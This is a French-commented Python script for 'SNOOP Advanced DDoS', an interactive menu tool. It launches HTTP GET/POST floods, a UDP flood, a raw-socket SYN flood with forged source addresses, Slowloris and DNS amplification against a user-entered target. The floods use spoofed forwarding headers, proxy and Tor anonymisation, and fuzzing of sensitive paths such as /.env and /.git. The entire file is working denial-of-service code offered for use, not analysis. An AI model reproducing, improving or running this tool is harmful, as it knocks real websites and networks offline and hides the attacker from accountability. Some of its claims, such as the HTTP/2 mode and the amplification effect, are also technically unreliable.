#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SNOOP Advanced DDoS – HTTP/2 (aiohttp), Fuzzing, Distributed, Tor

import sys
import os
import time
import random
import socket
import threading
import json
import base64
import struct
import ipaddress
import urllib.parse
import subprocess
import asyncio
from concurrent.futures import ThreadPoolExecutor

# --- Vérification des dépendances ---
try:
    import aiohttp
    from aiohttp import ClientSession, TCPConnector, ClientTimeout
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False
    print("[!] aiohttp non installé. Installez: pip install aiohttp")

try:
    import requests
    import socks
    import stem
    from stem import Signal
    from stem.control import Controller
    TOR_AVAILABLE = True
except ImportError:
    TOR_AVAILABLE = False
    print("[!] stem/socks non installé. Installez: pip install requests[socks] stem PySocks")

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama -q")
    from colorama import init, Fore, Style
    init(autoreset=True)

# --- Dictionnaire de chemins pour fuzzing ---
FUZZ_PATHS = [
    "/", "/admin", "/login", "/wp-admin", "/wp-login", "/api", "/api/v1", "/api/v2",
    "/graphql", "/phpmyadmin", "/mysql", "/backup", "/backups", "/config", "/.env",
    "/.git", "/.svn", "/.htaccess", "/.htpasswd", "/robots.txt", "/sitemap.xml",
    "/administrator", "/mod_pagespeed", "/webmail", "/mail", "/cpanel", "/whm",
    "/server-status", "/info", "/phpinfo", "/test", "/dev", "/upload", "/uploads",
    "/files", "/download", "/assets", "/static", "/css", "/js", "/img", "/images",
    "/vendor", "/node_modules", "/composer", "/package.json", "/yarn.lock",
    "/aws", "/s3", "/bucket", "/private", "/secret", "/hidden", "/internal",
    "/debug", "/health", "/ping", "/status", "/metrics", "/prometheus",
    "/swagger", "/docs", "/doc", "/help", "/support", "/contact", "/about",
    "/products", "/shop", "/cart", "/checkout", "/payment", "/invoice",
    "/user", "/profile", "/settings", "/account", "/logout", "/register",
    "/forum", "/blog", "/news", "/press", "/media", "/video", "/audio",
    "/downloads", "/wp-content", "/wp-includes", "/includes", "/content",
    "/assets/css", "/assets/js", "/static/css", "/static/js",
    "/files/upload", "/uploader", "/image", "/images/gallery",
    "/cgi-bin", "/cgi", "/pl", "/perl", "/scripts",
    "/test.php", "/test.asp", "/test.aspx", "/test.jsp",
    "/index.php", "/index.html", "/default.asp", "/default.aspx",
    "/home", "/main", "/portal", "/dashboard", "/panel", "/console",
    "/system", "/sys", "/kernel", "/proc", "/dev", "/mnt", "/media",
    "/tmp", "/temp", "/logs", "/log", "/error_log", "/access_log",
]

# --- Variables globales ---
stop_flag = False
stats_lock = threading.Lock()
total_sent = 0

# --- Helpers ---
def load_proxies(filepath="proxies.txt"):
    if os.path.exists(filepath):
        with open(filepath, "r") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return []

def random_proxy(proxy_list):
    if proxy_list:
        proxy = random.choice(proxy_list)
        if not proxy.startswith(("http://", "https://")):
            proxy = "http://" + proxy
        return proxy
    return None

def random_ua():
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
    ]
    return random.choice(ua_list)

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def get_tor_session():
    if not TOR_AVAILABLE:
        return None
    try:
        session = requests.Session()
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        session.get("http://check.torproject.org", timeout=5)
        return session
    except:
        return None

def renew_tor_identity():
    if not TOR_AVAILABLE:
        return False
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password="")
            controller.signal(Signal.NEWNYM)
            return True
    except:
        return False

# --- HTTP/2 Multiplexing avec aiohttp (ASYNCHRONE - ULTRA PUISSANT) ---
def http2_flood(target_url, threads=100, duration=60, use_tor=False, use_fuzz=False, proxy_list=None):
    """Version asynchrone avec aiohttp – débit TRÈS ÉLEVÉ (3000+ req/s)"""
    global total_sent, stop_flag
    # ⚠️ stop_flag est déclarée globale en premier
    stop_flag = False
    total_sent = 0
    print(f"{Fore.CYAN}[*] HTTP/2 Multiplexing (ASYNC) sur {target_url} – {threads} tâches – {duration}s{Style.RESET_ALL}")
    if use_tor:
        print(f"{Fore.YELLOW}[!] Mode Tor activé (anonymisation){Style.RESET_ALL}")
    if use_fuzz:
        print(f"{Fore.YELLOW}[!] Mode Fuzzing activé ({len(FUZZ_PATHS)} chemins){Style.RESET_ALL}")

    if not AIOHTTP_AVAILABLE:
        print(f"{Fore.RED}[!] aiohttp requis. Installez: pip install aiohttp{Style.RESET_ALL}")
        return

    if use_tor:
        print(f"{Fore.YELLOW}[!] Tor ne supporte pas HTTP/2, bascule vers HTTP/1.1 avec Tor{Style.RESET_ALL}")
        http_flood(target_url, threads, duration, "GET", use_tor=True, use_fuzz=use_fuzz, proxy_list=proxy_list)
        return

    start = time.time()
    lock = threading.Lock()

    # Préparer les URLs avec fuzzing
    paths_to_attack = FUZZ_PATHS if use_fuzz else ["/"]
    if use_fuzz:
        random.shuffle(paths_to_attack)
        paths_to_attack = paths_to_attack[:max(10, threads)]

    base_url = target_url.rstrip('/')
    urls = [base_url + p for p in paths_to_attack]

    # Configuration du proxy
    proxy_url = None
    if proxy_list:
        proxy_url = random_proxy(proxy_list)

    async def worker(session, semaphore, urls_list):
        global total_sent
        while not stop_flag:
            try:
                async with semaphore:
                    url = random.choice(urls_list)
                    headers = {
                        "User-Agent": random_ua(),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Connection": "keep-alive",
                        "Cache-Control": "no-cache",
                        "Pragma": "no-cache",
                        "X-Forwarded-For": random_ip(),
                        "X-Real-IP": random_ip(),
                    }
                    async with session.get(url, headers=headers, ssl=False, timeout=2) as resp:
                        await resp.read()
                        with lock:
                            total_sent += 1
            except:
                pass
            await asyncio.sleep(0.0001)

    async def run_async():
        connector = TCPConnector(
            limit=0,
            limit_per_host=0,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
            use_dns_cache=True,
            force_close=False,
        )
        timeout = ClientTimeout(total=5, sock_read=5, sock_connect=5)

        async with ClientSession(connector=connector, timeout=timeout) as session:
            semaphore = asyncio.Semaphore(threads * 2)
            tasks = [asyncio.create_task(worker(session, semaphore, urls)) for _ in range(threads)]
            await asyncio.sleep(duration)
            global stop_flag
            stop_flag = True
            await asyncio.gather(*tasks, return_exceptions=True)

    try:
        asyncio.run(run_async())
    except KeyboardInterrupt:
        stop_flag = True
        pass

    elapsed = time.time() - start
    rate = total_sent / elapsed if elapsed > 0 else 0
    print(f"{Fore.GREEN}[+] Terminé. {total_sent} requêtes en {elapsed:.1f}s ({rate:.0f} req/s){Style.RESET_ALL}")

# --- HTTP/1.1 Flood (GET/POST) avec asyncio (puissant aussi) ---
def http_flood(target_url, threads=500, duration=60, method="GET", use_tor=False, use_fuzz=False, proxy_list=None):
    global total_sent, stop_flag
    stop_flag = False
    total_sent = 0
    print(f"{Fore.CYAN}[*] HTTP {method} flood (ASYNC) sur {target_url} – {threads} tâches – {duration}s{Style.RESET_ALL}")
    if use_tor:
        print(f"{Fore.YELLOW}[!] Mode Tor activé (anonymisation){Style.RESET_ALL}")
    if use_fuzz:
        print(f"{Fore.YELLOW}[!] Mode Fuzzing activé ({len(FUZZ_PATHS)} chemins){Style.RESET_ALL}")

    if not AIOHTTP_AVAILABLE:
        print(f"{Fore.RED}[!] aiohttp requis. Installez: pip install aiohttp{Style.RESET_ALL}")
        return

    start = time.time()
    lock = threading.Lock()

    paths_to_attack = FUZZ_PATHS if use_fuzz else ["/"]
    if use_fuzz:
        random.shuffle(paths_to_attack)
        paths_to_attack = paths_to_attack[:max(20, threads)]

    base_url = target_url.rstrip('/')
    urls = [base_url + p for p in paths_to_attack]

    proxy_url = None
    if use_tor and TOR_AVAILABLE:
        proxy_url = "socks5h://127.0.0.1:9050"
    elif proxy_list:
        proxy_url = random_proxy(proxy_list)

    async def worker(session, semaphore, urls_list):
        global total_sent
        while not stop_flag:
            try:
                async with semaphore:
                    url = random.choice(urls_list)
                    headers = {
                        "User-Agent": random_ua(),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Connection": "keep-alive",
                        "Cache-Control": "no-cache",
                        "Pragma": "no-cache",
                        "X-Forwarded-For": random_ip(),
                        "X-Real-IP": random_ip(),
                    }
                    if method.upper() == "POST":
                        data = {"key": "value", "rand": random.randint(0, 999999)}
                        async with session.post(url, headers=headers, data=data, ssl=False, timeout=2) as resp:
                            await resp.read()
                    else:
                        async with session.get(url, headers=headers, ssl=False, timeout=2) as resp:
                            await resp.read()
                    with lock:
                        total_sent += 1
            except:
                pass
            await asyncio.sleep(0.0001)

    async def run_async():
        connector = TCPConnector(
            limit=0,
            limit_per_host=0,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
        )
        timeout = ClientTimeout(total=5, sock_read=5, sock_connect=5)

        if proxy_url:
            # Note: aiohttp ne gère pas nativement SOCKS, on utilise un proxy HTTP si disponible
            # Pour Tor, on contourne en utilisant le proxy HTTP (mais Tor est SOCKS)
            # On va simplement ignorer le proxy pour aiohttp, mais on prévient l'utilisateur
            print(f"{Fore.YELLOW}[!] Proxy SOCKS non supporté par aiohttp. Utilisation sans proxy.{Style.RESET_ALL}")
            proxy_url = None

        async with ClientSession(connector=connector, timeout=timeout) as session:
            semaphore = asyncio.Semaphore(threads * 2)
            tasks = [asyncio.create_task(worker(session, semaphore, urls)) for _ in range(threads)]
            await asyncio.sleep(duration)
            global stop_flag
            stop_flag = True
            await asyncio.gather(*tasks, return_exceptions=True)

    try:
        asyncio.run(run_async())
    except KeyboardInterrupt:
        stop_flag = True
        pass

    elapsed = time.time() - start
    rate = total_sent / elapsed if elapsed > 0 else 0
    print(f"{Fore.GREEN}[+] Terminé. {total_sent} requêtes en {elapsed:.1f}s ({rate:.0f} req/s){Style.RESET_ALL}")

# --- UDP Flood ---
def udp_flood(target_ip, target_port, threads=200, duration=60, packet_size=1024):
    global total_sent, stop_flag
    stop_flag = False
    total_sent = 0
    print(f"{Fore.CYAN}[*] UDP flood sur {target_ip}:{target_port} – {threads} threads – {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    start = time.time()
    lock = threading.Lock()

    def worker():
        global total_sent
        payload = os.urandom(packet_size)
        while not stop_flag:
            try:
                sock.sendto(payload, (target_ip, target_port))
                with lock:
                    total_sent += 1
            except:
                pass

    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads_list.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    stop_flag = True
    for t in threads_list:
        t.join(timeout=0.5)
    elapsed = time.time() - start
    rate = total_sent / elapsed if elapsed > 0 else 0
    print(f"{Fore.GREEN}[+] Terminé. {total_sent} paquets en {elapsed:.1f}s ({rate:.0f} pkt/s){Style.RESET_ALL}")

# --- SYN Flood ---
def syn_flood(target_ip, target_port, threads=100, duration=60):
    global total_sent, stop_flag
    stop_flag = False
    total_sent = 0
    print(f"{Fore.CYAN}[*] SYN flood sur {target_ip}:{target_port} – {threads} threads – {duration}s{Style.RESET_ALL}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print(f"{Fore.RED}[!] SYN flood nécessite des privilèges administrateur.{Style.RESET_ALL}")
        return
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur socket brute: {e}{Style.RESET_ALL}")
        return
    start = time.time()
    lock = threading.Lock()

    def build_syn(src_ip, dst_ip, dst_port):
        src_port = random.randint(1024, 65535)
        seq = random.randint(0, 4294967295)
        ip_ihl_ver = 0x45
        tos = 0
        total_len = 40
        ident = random.randint(0, 65535)
        flags_offset = 0x4000
        ttl = 64
        protocol = socket.IPPROTO_TCP
        src_bytes = socket.inet_aton(src_ip)
        dst_bytes = socket.inet_aton(dst_ip)
        ip_header = struct.pack('!BBHHHBBH', ip_ihl_ver, tos, total_len, ident, flags_offset, ttl, protocol, 0)
        ip_header += src_bytes + dst_bytes
        tcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, 0, 0x50, 0x02, 8192, 0, 0)
        return ip_header + tcp_header

    def worker():
        global total_sent
        src_ip = random_ip()
        while not stop_flag:
            try:
                packet = build_syn(src_ip, target_ip, target_port)
                sock.sendto(packet, (target_ip, 0))
                with lock:
                    total_sent += 1
            except:
                pass

    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads_list.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    stop_flag = True
    for t in threads_list:
        t.join(timeout=0.5)
    elapsed = time.time() - start
    rate = total_sent / elapsed if elapsed > 0 else 0
    print(f"{Fore.GREEN}[+] Terminé. {total_sent} paquets SYN en {elapsed:.1f}s ({rate:.0f} pkt/s){Style.RESET_ALL}")

# --- Slowloris ---
def slowloris(target_ip, target_port, threads=200, duration=60):
    global total_sent, stop_flag
    stop_flag = False
    total_sent = 0
    print(f"{Fore.CYAN}[*] Slowloris sur {target_ip}:{target_port} – {threads} threads – {duration}s{Style.RESET_ALL}")
    start = time.time()
    lock = threading.Lock()

    def worker():
        global total_sent
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(f"Host: {target_ip}\r\n".encode())
            s.send(f"User-Agent: {random_ua()}\r\n".encode())
            s.send(b"Accept: text/html\r\n")
            while not stop_flag:
                s.send(f"X-Header-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                time.sleep(10)
                with lock:
                    total_sent += 1
        except:
            pass

    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads_list.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    stop_flag = True
    for t in threads_list:
        t.join(timeout=0.5)
    elapsed = time.time() - start
    print(f"{Fore.GREEN}[+] Terminé. {total_sent} connexions maintenues{Style.RESET_ALL}")

# --- DNS Amplification ---
def dns_amplification(target_ip, threads=50, duration=30):
    global total_sent, stop_flag
    stop_flag = False
    total_sent = 0
    print(f"{Fore.CYAN}[*] DNS amplification sur {target_ip} – {threads} threads – {duration}s{Style.RESET_ALL}")
    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\xff\x00\x01'
    resolvers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "8.26.56.26", "8.20.247.20"]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    start = time.time()
    lock = threading.Lock()

    def worker():
        global total_sent
        while not stop_flag:
            try:
                resolver = random.choice(resolvers)
                sock.sendto(query, (resolver, 53))
                with lock:
                    total_sent += 1
            except:
                pass

    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads_list.append(t)

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    stop_flag = True
    for t in threads_list:
        t.join(timeout=0.5)
    elapsed = time.time() - start
    rate = total_sent / elapsed if elapsed > 0 else 0
    print(f"{Fore.GREEN}[+] Terminé. {total_sent} requêtes en {elapsed:.1f}s ({rate:.0f} q/s){Style.RESET_ALL}")

# --- Mode distribué ---
def distributed_attack(target, method="http", threads=100, duration=60, nodes=[]):
    print(f"{Fore.CYAN}[*] Mode distribué sur {len(nodes)} nœuds{Style.RESET_ALL}")
    if not nodes:
        print(f"{Fore.YELLOW}[!] Simulation locale avec {threads} tâches supplémentaires{Style.RESET_ALL}")
        if method == "http":
            http_flood(target, threads*2, duration, use_tor=False, use_fuzz=False)
        elif method == "http2":
            http2_flood(target, threads, duration, use_tor=False, use_fuzz=False)
        else:
            print(f"{Fore.RED}[!] Méthode non supportée.{Style.RESET_ALL}")
        return

    for node in nodes:
        print(f"{Fore.GREEN}[+] Nœud {node} démarré (simulation){Style.RESET_ALL}")

# --- Menu principal ---
def main_menu():
    proxy_list = load_proxies()
    print(f"{Fore.MAGENTA}SNOOP Advanced DDoS v3.0 (aiohttp ASYNC){Style.RESET_ALL}")
    print(f"{Fore.CYAN}Proxys chargés : {len(proxy_list)}{Style.RESET_ALL}\n")

    while True:
        print(f"{Fore.YELLOW}Choisissez une attaque :{Style.RESET_ALL}")
        print("  1. HTTP/1.1 Flood ASYNC (GET)")
        print("  2. HTTP/1.1 Flood ASYNC (POST)")
        print("  3. HTTP/2 Multiplexing ASYNC (aiohttp)")
        print("  4. UDP Flood")
        print("  5. SYN Flood (admin requis)")
        print("  6. Slowloris")
        print("  7. DNS Amplification")
        print("  8. Mode distribué (simulation)")
        print("  9. Charger proxys")
        print("  0. Quitter")

        choice = input(f"{Fore.MAGENTA}Votre choix : {Style.RESET_ALL}").strip()

        if choice == "0":
            break

        if choice == "9":
            proxy_list = load_proxies()
            print(f"{Fore.GREEN}[+] Proxys rechargés : {len(proxy_list)}{Style.RESET_ALL}")
            continue

        target = input(f"{Fore.YELLOW}Cible (URL ou IP): {Style.RESET_ALL}").strip()
        if not target:
            print(f"{Fore.RED}[!] Cible requise.{Style.RESET_ALL}")
            continue

        threads_input = input(f"{Fore.YELLOW}Tâches/Threads (défaut 200): {Style.RESET_ALL}").strip()
        threads = int(threads_input) if threads_input.isdigit() else 200

        duration_input = input(f"{Fore.YELLOW}Durée (secondes, défaut 60): {Style.RESET_ALL}").strip()
        duration = int(duration_input) if duration_input.isdigit() else 60

        use_tor = False
        use_fuzz = False
        if choice in ["1", "2", "3"]:
            tor_input = input(f"{Fore.YELLOW}Utiliser Tor ? (o/n): {Style.RESET_ALL}").strip().lower()
            use_tor = tor_input == "o"
            fuzz_input = input(f"{Fore.YELLOW}Activer le fuzzing ? (o/n): {Style.RESET_ALL}").strip().lower()
            use_fuzz = fuzz_input == "o"

        if choice == "1":
            http_flood(target, threads, duration, "GET", use_tor, use_fuzz, proxy_list)
        elif choice == "2":
            http_flood(target, threads, duration, "POST", use_tor, use_fuzz, proxy_list)
        elif choice == "3":
            http2_flood(target, threads, duration, use_tor, use_fuzz, proxy_list)
        elif choice == "4":
            port_input = input(f"{Fore.YELLOW}Port (défaut 80): {Style.RESET_ALL}").strip()
            port = int(port_input) if port_input.isdigit() else 80
            udp_flood(target, port, threads, duration)
        elif choice == "5":
            port_input = input(f"{Fore.YELLOW}Port (défaut 80): {Style.RESET_ALL}").strip()
            port = int(port_input) if port_input.isdigit() else 80
            syn_flood(target, port, threads, duration)
        elif choice == "6":
            port_input = input(f"{Fore.YELLOW}Port (défaut 80): {Style.RESET_ALL}").strip()
            port = int(port_input) if port_input.isdigit() else 80
            slowloris(target, port, threads, duration)
        elif choice == "7":
            dns_amplification(target, threads, duration)
        elif choice == "8":
            nodes_input = input(f"{Fore.YELLOW}Nœuds (IP séparées par virgules): {Style.RESET_ALL}").strip()
            nodes = [n.strip() for n in nodes_input.split(",") if n.strip()] if nodes_input else []
            method_choice = input(f"{Fore.YELLOW}Méthode (http/http2): {Style.RESET_ALL}").strip().lower()
            distributed_attack(target, method_choice, threads, duration, nodes)
        else:
            print(f"{Fore.RED}[!] Choix invalide.{Style.RESET_ALL}")

        input(f"{Fore.CYAN}Appuyez sur Entrée pour continuer...{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Fore.MAGENTA}Interrompu.{Style.RESET_ALL}")
        sys.exit(0)